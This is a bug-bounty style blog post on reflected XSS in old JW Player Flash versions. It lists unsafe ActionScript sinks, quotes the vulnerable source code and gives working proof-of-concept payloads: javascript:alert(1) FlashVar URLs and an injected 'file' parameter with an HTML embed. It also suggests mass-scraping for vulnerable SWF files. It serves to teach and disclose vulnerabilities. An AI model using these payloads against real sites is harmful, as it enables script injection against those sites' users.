---
layout: post
title: Fun with Flash
---

## Intro
In Frans Rosen’s [talk on bug bounties](https://www.youtube.com/watch?v=KDo68Laayh8), he recommends searching for flash files, since a lot of them are vulnerable.  This got me interested in reading up on Flash files.

## The Tools  
- https://www.owasp.org/index.php/Testing_for_Cross_site_flashing_(OWASP-DV-004)
- To decompile Flash into Actionscript, use [JPEXS](https://www.free-decompiler.com/flash/download/).
- Adobe also made an app called [SWF Investigator](http://labs.adobe.com/technologies/swfinvestigator/).  In one of the tabs, it lists out all the vulnerable functions in the file.

## What’s wrong with Flash?
There are a lot of unsafe functions in Actionscript:

```
loadVariables()
loadMovie()
getURL()
loadMovie()
loadMovieNum()
FScrollPane.loadScrollContent()
LoadVars.load 
LoadVars.send 
XML.load ( 'url' )
LoadVars.load ( 'url' ) 
Sound.loadSound( 'url' , isStreaming ); 
NetStream.play( 'url' );
flash.external.ExternalInterface.call(_root.callback)
HtmlText
```

The other issue is that you can add parameters (Flashvars) to the URL.  Combine these two issues and you can create reflected XSS attacks like this: https://mysite.com/player.swf?callback=javascript:alert(1).  

## Example: XSS in JW Player v3.16 and v4.3
I came across a copy of JW Player 3.16 and found an XSS vulnerability.  Version 5 also had a few XSS vulns, which you can read about [here](https://nealpoole.com/blog/2013/04/unpatched-reflected-xss-in-jw-player-5/) and [here](https://packetstormsecurity.com/files/113332/JW-Player-5.9-Cross-Site-Scripting-Content-Spoofing.html).  They weren’t interested in doing hotfixes for old versions, but they are fixed in the current JWPlayer 7.8.

### v3.16
Anyways, for v3.16, you can find the source code here:
https://github.com/psych0d0g/kplaylist-ng/tree/master/mediaplayer-3-16

In ```ConfigManager.as```, we find these lines:

```
    public function goTo(obj,itm) {
        getURL(obj.ref.config['aboutlnk'],'_blank');
    };
```
The ```aboutlnk``` is a FlashVar.  getURL is an unsafe function that will run javascript.  To get this to work you need to paste ```http://localhost/mediaplayer.swf?aboutlnk=javascript:alert(1)``` , right click to get the context menu, and then click the “About” option.  This works in Firefox v50.

### v4.3
I found a copy of [version v4.3](https://web.archive.org/web/20121226095419/http://developer.longtailvideo.com/trac/changeset/HEAD/tags/mediaplayer-4.3?old_path=%2F&format=zip) in the Internet Archive.  The vulnerability is still there.  

In ```Rightclick.as```:

```
	/** jump to the about page. **/
	private function aboutSetter(evt:ContextMenuEvent):void {
		navigateToURL(new URLRequest(view.config['aboutlink']),'_blank');
	};
```

In v4.3, they rewrote it in ActionScript 3.  So they use ```navigateToURL``` instead of ```getURL```, but it's still not a safe function to pass FlashVars to.  The FlashVar variable name also changed from ```aboutlnk``` to ```actionlink```.

This URL works in Firefox v50:```http://localhost/mediaplayer.swf?aboutlink=javascript:alert(1)```

### v5.1

Out of curiousity, I checked [v5.1](https://web.archive.org/web/20110923000742/http://developer.longtailvideo.com/trac/changeset/1965/tags/mediaplayer-5.1.910?old_path=%2F&format=zip) and they finally fixed it by hardcoding the value.  

In ```Rightclick.as```:

```
/** jump to the about page. **/
		protected function aboutHandler(evt:ContextMenuEvent):void {
			navigateToURL(new URLRequest('http://www.longtailvideo.com/players/jw-flv-player'), '_blank');
		}
```

I contacted them about this, and asked if they were going to issue a patch or send out a bulletin.  They replied they didn't support old versions.


## Almost, but not quite
In this code, from ```CallbackView.as```, we see another example of how we can use FlashVars to make the Flash file run javascript:

```
/** sending the current file,title,id,state,timestamp to callback **/
    private function sendVars(stt:String,dur:Number,cpl:Boolean) {
        clearInterval(playSentInt);
        if(config['callback'] == "urchin" || config['callback'] == "analytics") {
            var fil = feeder.feed[currentItem]["file"];
            var fcn = "javascript:pageTracker._trackPageview";
            if(config['callback'] == "urchin") {
                fcn = "javascript:urchinTracker";
            }
            if(fil.indexOf('http') != undefined) {
                fil = fil.substring(fil.indexOf('/',7)+1);
            }
            if(stt == "start") {
                getURL(fcn+"('/start_stream/"+fil+"');");
            } else if (stt == "stop" && cpl == true) {
                getURL(fcn+"('/end_stream/"+fil+"');");
            }
        } else {
            varsObject.file = feeder.feed[currentItem]["file"];
            varsObject.title = feeder.feed[currentItem]["title"];
            varsObject.id = feeder.feed[currentItem]["id"];
            varsObject.state = stt;
            varsObject.duration = dur;
            varsObject.sendAndLoad(config["callback"],varsObject,"POST");
        }
    };
```

Using the “callback” and “file” FlashVars, we can get the line 

```
getURL(fcn+"('/end_stream/"+fil+"');");
``` 
to execute.  


If we use ?file=video.flv&callback=urchin, it would fire off 
```
javascript:urchinTracker(‘end_stream/video.flv’);
```
but that would be pretty boring.  


By changing the “file” parameter, however, we can get it to execute custom Javascript.  

Example: 
```
file=video');alert(1);void('.flv. 
```

This would cause the browser to execute 
```
javascript:urchinTracker(‘end_stream/video’);alert(1):void(‘.flv’);
```

Unfortunately, this can’t be used for a reflected XSS attack, since the function “urchinTracker” isn’t there if you just pull up the swf file url.  The only way to exploit this would be if a page embedded the the file and also let you specify the flashvars in the url.

As an example, try putting the following in a webpage.  It will automatically play, stop, and pop an alert box.  It works in Firefox, Chrome, and Safari.

```html
function urchinTracker(){
}
 <object style="height:360px;width:640px;" data="mediaplayer.swf" type="application/x-shockwave-flash" allowscriptaccess="always" flashvars="file=video');alert(1);void('.flv&enablejs=true&callback=urchin&autostart=true" id="jstest" ></object> 
```

## Automate it
As with many things in security, finding these files and exploiting them can be tedious if you have to do it manually.  A better approach would be to write a script to scrape Google for the Flash files, download them, decompile them, and grep the unsafe function names.
